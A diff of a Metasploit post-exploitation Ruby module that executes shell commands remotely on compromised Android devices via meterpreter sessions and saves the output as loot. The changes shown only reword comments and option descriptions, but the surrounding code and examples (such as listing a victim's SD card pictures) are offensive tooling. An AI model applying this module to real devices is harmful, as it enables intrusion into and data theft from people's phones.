@@ -17,13 +17,13 @@
 # [ POST-EXPLOITATION MODULE DESCRIPTION ]
 # Android/meterpreter payloads does not allow users to manipulate target file system. This msf post-exploitation
 # module will allow users to input/execute remotely commands in target system, display on screen the command output
-# and store outputs into ~/.msf4/loot folder if configurated (set STORE_LOOT true)
+# and store outputs (set STORE_LOOT true) into sellected loot folder (set LOOT_FOLDER /root)
 #
 #
 # [ MODULE OPTIONS ]
 # The session number to run this module on      => set SESSION 3
-# Store dumped data to msf4/loot folder?        => set STORE_LOOT true
-# The full path [local] where to store logfiles => set LOOT_FOLDER /root
+# Store session outputs to loot folder?         => set STORE_LOOT true
+# The full path [local] where to store logs     => set LOOT_FOLDER /root
 # The bash command to be executed remotely      => set EXEC_COMMAND <command>
 # example: set EXEC_COMMAND ls -AR SD card/Pictures
 # example: set EXEC_COMMAND mkdir SD card/Download/testDir
@@ -85,7 +85,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'execute commands in android',
                         'Description'   => %q{
-                                        Android/meterpreter payloads does not allow users to manipulate target file system. This msf post-exploitation module will allow users to input/execute remotely commands in target system, display on screen the command output and store outputs into ~/.msf4/loot folder if configurated (set STORE_LOOT true)
+                                        Android/meterpreter payloads does not allow users to manipulate target file system. This msf post-exploitation module will allow users to input/execute remotely commands in target system, display on screen the command output and store outputs (set STORE_LOOT true) into sellected loot folder (set LOOT_FOLDER /root)
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -120,13 +120,12 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on', '1']),
-                                OptBool.new('STORE_LOOT', [false, 'Store dumped data into ~/.msf4/loot folder?', false]),
-                                OptString.new('LOOT_FOLDER', [ false, 'The full path [local] where to store logfiles', '/root']),
+                                OptBool.new('STORE_LOOT', [false, 'Store session outputs to loot folder?', false]),
+                                OptString.new('LOOT_FOLDER', [ false, 'The full path [local] where to store logs', '/root']),
                                 OptString.new('EXEC_COMMAND', [true, 'The bash command to be executed remotely', 'ls -A'])
                         ], self.class)
 
         end
-
 
 
 #
@@ -209,7 +208,7 @@ def run
             Rex::sleep(0.2)
           #
           # store data into a local variable (data_dump) ..
-          # to be able to write the logfile and display the outputs ..
+          # to be able to write the logfile
           #
           data_dump = []
           data_dump << "************************************\n"
@@ -231,9 +230,7 @@ def run
           # generating random logfile name (6 chars)
           rand = Rex::Text.rand_text_alpha(6)
           loot_folder = datastore['LOOT_FOLDER']
-          #
           # create session output logfile
-          #
           File.open("#{loot_folder}/android_#{rand}.txt", "w") do |f|
           f.write("#{data_dump}")
           f.close
